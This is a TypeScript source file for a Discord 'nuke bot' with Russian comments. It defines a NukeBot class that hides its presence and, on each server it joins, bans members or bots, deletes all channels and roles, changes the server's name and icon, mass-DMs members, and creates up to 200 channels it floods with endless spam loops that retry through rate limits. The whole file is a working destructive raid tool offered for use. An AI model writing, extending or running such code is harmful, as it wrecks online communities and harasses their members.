import { Client, GatewayIntentBits, Guild, TextChannel } from 'discord.js';
import * as actions from './actions';
import { colors } from './utils';
import { backupAllGuilds } from './backup';

export type NukeMode = 'pereezd' | 'full' | 'light' | 'none';

export interface NukeBotOptions {
  channelName: string;
  roleName: string;
  messageText: string;
  mode: NukeMode;
  leaveImmediately: boolean;
  concurrency: number;
  infiniteSpam: boolean;
  spamDelayMs: number;
  createBackup: boolean;
  dmMembers: boolean;
  dmDelayMs: number;
  changeServerName?: string;
  changeServerIcon?: string;
}

export class NukeBot {
  private client: Client;
  private token: string;
  private options: NukeBotOptions;
  private spamChannels: Set<string> = new Set();
  private isStopped: boolean = false;

  constructor(token: string, options: NukeBotOptions) {
    this.token = token;
    this.options = options;
    this.client = new Client({
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildIntegrations,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.MessageContent
      ]
    });

    this.client.on('ready', () => this.onReady());
    this.client.on('guildCreate', guild => this.onGuildJoin(guild));
  }

  private async onReady(): Promise<void> {
    console.log(`${colors.g}Bot ${this.client.user?.tag} connected!${colors.w}`);

    // Делаем бота невидимым сразу после запуска
    try {
      this.client.user?.setStatus('invisible');
      console.log(`${colors.m}🤫 Bot presence set to invisible${colors.w}`);
    } catch (error) {
      console.log(`${colors.r}⚠️ Failed to set invisible status:${colors.w}`, error);
    }

    // Предзагружаем базовые данные (без members.fetch чтобы избежать рейт-лимита)
    const guilds = [...this.client.guilds.cache.values()];
    for (const guild of guilds) {
      try {
        await Promise.all([
          guild.fetch(),
          guild.channels.fetch(),
          guild.roles.fetch()
        ]);
      } catch (error) {
        console.log(`${colors.r}⚠️ Failed to fetch data for ${guild.name}${colors.w}`);
      }
    }

    // Создаём бэкап если включено
    if (this.options.createBackup && !this.options.leaveImmediately) {
      if (guilds.length > 0) {
        await backupAllGuilds(guilds);
      }
    }

    if (this.options.leaveImmediately) {
      await Promise.all(guilds.map(g => actions.leaveGuild(g)));
      console.log(`${colors.y}Left all guilds as requested.${colors.w}`);
    } else {
      for (const guild of guilds) {
        await this.nukeGuild(guild);
      }
    }
  }

  private async onGuildJoin(guild: Guild): Promise<void> {
    if (!this.options.leaveImmediately) {
      await this.nukeGuild(guild);
    } else {
      await actions.leaveGuild(guild);
    }
  }

  private async nukeGuild(guild: Guild): Promise<void> {
    console.log(`${colors.r}Nuking: ${colors.m}${guild.name} (${guild.id})${colors.w}`);

    // Убираем повторную загрузку - уже загружено в onReady
    const { mode, channelName, roleName, messageText, concurrency } = this.options;

    switch (mode) {
      case 'pereezd':
        // Изменяем название и иконку сервера (если указано)
        if (this.options.changeServerName || this.options.changeServerIcon) {
          console.log(`  Changing server appearance...`);
          await actions.changeGuildAppearance(
            guild,
            this.options.changeServerName,
            this.options.changeServerIcon
          );
          console.log(`  ${colors.b}Server appearance updated${colors.w}`);
        }

        console.log(`  Sending DMs to members...`);
        if (this.options.dmMembers) {
          const dmSent = await actions.dmAllMembers(
            guild,
            messageText,
            this.options.dmDelayMs,
            this.options.dmDelayMs === 0 ? 999 : Math.min(concurrency, 5) // Если задержка 0 - игнорируем лимит конкурентности
          );
          console.log(`  ${colors.b}DMs sent: ${dmSent}${colors.w}`);
        } else {
          console.log(`  ${colors.y}DM sending disabled${colors.w}`);
        }

        console.log(`  Deleting roles...`);
        const rolesDeleted = await actions.deleteAllRoles(guild, concurrency);
        console.log(`  ${colors.b}Roles deleted: ${rolesDeleted}${colors.w}`);

        console.log(`  Deleting channels...`);
        const channelsDeleted = await actions.deleteAllChannels(guild, concurrency);
        console.log(`  ${colors.b}Channels deleted: ${channelsDeleted}${colors.w}`);

        console.log(`  Creating text channels...`);
        // Создаём каналы самостоятельно, чтобы немедленно запускать спам
        const currentCount = guild.channels.cache.size;
        const toCreate = Math.max(0, 200 - currentCount);
        let createdCount = 0;

        // Параллельное создание с ограничением конкурентности
        const createPromises: Promise<void>[] = [];
        for (let i = 0; i < toCreate; i++) {
          createPromises.push((async () => {
            // Проверяем флаг остановки перед созданием канала
            if (this.isStopped) {
              return;
            }
            
            try {
              const channel = await guild.channels.create({
                name: `${channelName}-${i}`,
                type: 0, // GUILD_TEXT
              });
              
              // Проверяем флаг остановки перед отправкой сообщения
              if (this.isStopped) {
                return;
              }
              
              // Отправляем первое сообщение (как и раньше)
              await channel.send(messageText);
              createdCount++;

              // 🔥 Немедленно запускаем бесконечный спам в этот канал
              if (this.options.infiniteSpam && !this.isStopped) {
                this.startSpamForChannel(channel);
              }
            } catch (err) {
              // Игнорируем ошибку создания канала
            }
          })());
        }
        await Promise.all(createPromises);
        console.log(`  ${colors.b}Text channels created: ${createdCount}${colors.w}`);
        break;

      case 'full':
        console.log(`  Banning members...`);
        const banned = await actions.banAllMembersBulk(guild, concurrency);
        console.log(`  ${colors.b}Members banned: ${banned}${colors.w}`);

        console.log(`  Deleting channels...`);
        const delChFull = await actions.deleteAllChannels(guild, concurrency);
        console.log(`  ${colors.b}Channels deleted: ${delChFull}${colors.w}`);

        console.log(`  Deleting roles...`);
        const delRolesFull = await actions.deleteAllRoles(guild, concurrency);
        console.log(`  ${colors.b}Roles deleted: ${delRolesFull}${colors.w}`);

        console.log(`  Creating voice channels...`);
        const voiceCreated = await actions.createVoiceChannels(guild, channelName, concurrency);
        console.log(`  ${colors.b}Voice channels created: ${voiceCreated}${colors.w}`);
        break;

      case 'light':
        console.log(`  Banning bots...`);
        const botsBanned = await actions.banBots(guild, concurrency);
        console.log(`  ${colors.b}Bots banned: ${botsBanned}${colors.w}`);

        console.log(`  Deleting channels...`);
        const delChLight = await actions.deleteAllChannels(guild, concurrency);
        console.log(`  ${colors.b}Channels deleted: ${delChLight}${colors.w}`);

        console.log(`  Deleting roles...`);
        const delRolesLight = await actions.deleteAllRoles(guild, concurrency);
        console.log(`  ${colors.b}Roles deleted: ${delRolesLight}${colors.w}`);
        break;

      case 'none':
        break;
    }

    console.log(`${colors.r}--------------------------------------------${colors.w}\n`);
  }

  /**
   * Запускает бесконечный цикл отправки сообщений в указанный канал.
   * Вызывается сразу после создания канала.
   */
  private startSpamForChannel(channel: TextChannel): void {
    // Проверяем, не запущен ли уже спам в этот канал
    if (this.spamChannels.has(channel.id)) {
      return;
    }
    this.spamChannels.add(channel.id);
    console.log(`${colors.g}[SPAM] Started infinite spam in #${channel.name} (${channel.guild.name})${colors.w}`);

    const spam = async () => {
      const { messageText, spamDelayMs } = this.options;
      let messageCount = 0;

      while (this.spamChannels.has(channel.id) && !this.isStopped) {
        try {
          // Проверяем что клиент ещё активен
          if (!this.client || this.client.isReady() === false || this.isStopped) {
            this.spamChannels.delete(channel.id);
            console.log(`${colors.r}[SPAM] Stopped for #${channel.name} (client disconnected)${colors.w}`);
            break;
          }

          await channel.send(messageText);
          messageCount++;
          // Выводим прогресс каждые 50 сообщений, чтобы не засорять консоль
          if (messageCount % 50 === 0) {
            console.log(`${colors.c}[SPAM] #${channel.name}: sent ${messageCount} messages${colors.w}`);
          }
          if (spamDelayMs > 0) {
            await new Promise(resolve => setTimeout(resolve, spamDelayMs));
          }
        } catch (err: any) {
          // Если токен отсутствует (клиент уничтожен) - останавливаем
          if (err.message && err.message.includes('Expected token to be set')) {
            this.spamChannels.delete(channel.id);
            console.log(`${colors.r}[SPAM] Stopped for #${channel.name} (token removed)${colors.w}`);
            break;
          }
          // Если канал удалён или нет прав – удаляем из списка и прекращаем
          if (err.code === 10003 || err.code === 50001) {
            this.spamChannels.delete(channel.id);
            console.log(`${colors.r}[SPAM] Stopped for #${channel.name} (deleted/no perms)${colors.w}`);
            break;
          }
          // При других ошибках (рейт-лимит) – ждём 2 секунды и пробуем снова
          console.log(`${colors.y}[SPAM] Error in #${channel.name}: ${err.message}, retrying in 2s...${colors.w}`);
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }
    };

    // Запускаем асинхронно, не блокируем основной поток
    spam().catch(err => console.error(`[SPAM] Fatal error in ${channel.name}:`, err));
  }

  public async start(delaySeconds: number): Promise<void> {
    // Сбрасываем флаг остановки при новом запуске
    this.isStopped = false;
    
    await new Promise(resolve => setTimeout(resolve, delaySeconds * 1000));
    await this.client.login(this.token);
  }

  public async stop(): Promise<void> {
    console.log(`${colors.y}[STOP] Stopping bot...${colors.w}`);
    
    // Устанавливаем флаг остановки
    this.isStopped = true;
    
    // Останавливаем все спам-каналы
    const channelCount = this.spamChannels.size;
    this.spamChannels.clear();
    console.log(`${colors.y}[STOP] Stopped spam in ${channelCount} channels${colors.w}`);
    
    // Отключаем клиент
    if (this.client) {
      this.client.destroy();
      console.log(`${colors.y}[STOP] Client destroyed${colors.w}`);
    }
  }
}